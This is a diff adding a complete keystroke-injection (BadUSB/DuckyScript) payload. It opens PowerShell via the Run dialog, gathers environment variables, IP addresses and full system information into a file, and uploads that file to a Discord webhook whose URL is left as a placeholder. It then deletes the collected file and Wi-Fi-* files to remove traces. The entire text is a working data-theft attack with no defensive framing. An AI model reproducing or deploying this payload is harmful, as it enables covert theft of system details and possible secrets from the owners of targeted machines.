@@ -1,0 +1,12 @@
+
+DELAY 1000
+GUI r
+DELAY 1000
+STRING powershell
+ENTER
+DELAY 2000
+STRING $url="YOUR-DISCORD-HOOK-URL-HERE";dir env: >> stats.txt;Get-NetIPAddress | Select-Object IPAddress,SuffixOrigin,InterfaceAlias | where IPAddress -notmatch '(127.0.0.1|169.254.\d+.\d+)' >> stats.txt;Get-ComputerInfo >> stats.txt;$Body=@{ content = "USEFUL INFORMATION ABOUT> $env:computername :"};Invoke-RestMethod -ContentType 'Application/Json' -Uri $url  -Method Post -Body ($Body | ConvertTo-Json);curl.exe -F "file1=@stats.txt" $url ; Remove-Item '.\stats.txt'
+ENTER
+DELAY 500
+STRING cd C:\Users\$env:UserName\Desktop; Remove-Item Wi-Fi-*; Remove-Item stats.txt;exit
+ENTER
